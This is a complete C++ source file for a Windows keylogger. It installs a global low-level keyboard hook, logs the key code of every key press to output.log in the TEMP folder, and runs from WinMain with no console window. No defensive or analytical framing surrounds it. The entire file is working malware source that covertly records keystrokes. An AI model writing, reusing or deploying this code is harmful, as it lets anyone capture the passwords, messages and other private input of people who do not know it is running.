#include <windows.h>
#include <fstream>

// Global hook handle
HHOOK hook;

// Low-level keyboard hook callback function
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::ofstream outputFile;
            outputFile.open(std::getenv("TEMP") + std::string("\\output.log"), std::ios_base::app);
            outputFile << "Key code: " << kbStruct->vkCode << std::endl;
            outputFile.close();
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

// WinMain function to hide the console window
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}

